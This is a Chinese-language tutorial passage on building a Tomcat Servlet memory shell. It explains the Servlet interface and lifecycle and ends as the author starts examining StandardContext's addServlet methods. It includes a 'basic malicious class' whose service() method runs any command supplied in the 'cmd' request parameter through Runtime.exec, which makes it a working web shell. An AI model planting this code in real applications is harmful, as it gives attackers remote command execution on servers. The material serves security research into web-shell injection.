# Servlet创建
  我们先来看看servlet接口有什么方法
```java
public interface Servlet {
	// 由servlet容器调用，向servlet表明该servlet正在被投入服务。
	// 在实例化servlet之后，servlet容器正好调用init方法一次。在servlet可以接收任何请求之前，init方法必须成功完成。
	// 如果init方法出现以下情况，servlet容器就不能将servlet放入服务中
	// 抛出一个ServletException
	// 在Web服务器定义的时间段内没有返回
	public void init(ServletConfig config) throws ServletException;

	// 返回一个ServletConfig对象，其中包含该Servlet的初始化和启动参数。返回的ServletConfig对象是传递给init方法的对象。
	// 这个接口的实现负责存储ServletConfig对象，以便这个方法能够返回它。实现这个接口的GenericServlet类已经做到了这一点。
	public ServletConfig getServletConfig();  

	// 由servlet容器调用，允许servlet对请求作出响应。
	// 这个方法只有在servlet的init()方法成功完成后才会被调用。
	// 对于抛出或发送错误的servlet，响应的状态代码总是应该被设置。
	// Servlet通常在多线程的Servlet容器内运行，可以同时处理多个请求。开发人员必须注意同步访问任何共享资源，如文件、网络连接和以及servlet的类和实例变量。关于Java中多线程编程的更多信息，可以在Java多线程编程教程中找到。
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException;

	// 返回有关Servlet的信息，如作者、版本和版权。
	// 该方法返回的字符串应该是纯文本，而不是任何形式的标记（如HTML、XML等）。
    public String getServletInfo();

    // 由servlet容器调用，向servlet表明该servlet将被退出服务。只有在servlet的服务方法中的所有线程都退出后，或者在超时期过后，才会调用这个方法。在servlet容器调用该方法后，它将不再调用该servlet的服务方法。
    // 这个方法给了servlet一个机会来清理任何被保留的资源（例如，内存、文件句柄、线程），并确保任何持久化状态与servlet在内存中的当前状态同步。
    public void destroy();
}
```
`service()`应该就是我们要写的那个执行的逻辑，我们的恶意代码应该就是放在这里的。

```java
package tomcatShell.Servlet;  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import java.io.IOException;  
  
// 基础恶意类   
public class ServletTest implements Servlet {  
    @Override  
 public void init(ServletConfig config) throws ServletException {  
  
    }  
  
    @Override  
 public ServletConfig getServletConfig() {  
        return null;  
 }  
  
    @Override  
 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
        String cmd = req.getParameter("cmd");  
 if (cmd !=null){  
            try{  
                Runtime.getRuntime().exec(cmd);  
 }catch (IOException e){  
                e.printStackTrace();  
 }catch (NullPointerException n){  
                n.printStackTrace();  
 }  
        }  
    }  
  
    @Override  
 public String getServletInfo() {  
        return null;  
 }  
  
    @Override  
 public void destroy() {  
  
    }  
}
```
配置web.xml看一眼，可以执行命令，没问题。
现在依旧还是那个问题，Servlet是怎么注册的？

Servlet的生命周期分为五部分
1. 加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建 `Servlet` 的实例
2. 初始化：当Servlet被实例化的时候，Tomcat会调用 `init()`方法初始化这个对象
3. 处理服务：当浏览器访问Servlet的时候，Servlet 会调用`service()`方法处理请求
4. 销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用`destroy()`方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
5. 卸载：当Servlet调用完`destroy()`方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用`init()`方法进行初始化操作

我个人思路是，不管怎么样，核心一定在 `StanderContext`中，我们类比Filter 和Listener，去核心中找找方法。
可以看到，这里重写了三个 `addServlet`
![](picture/Pasted%20image%2020260109115516.png)

































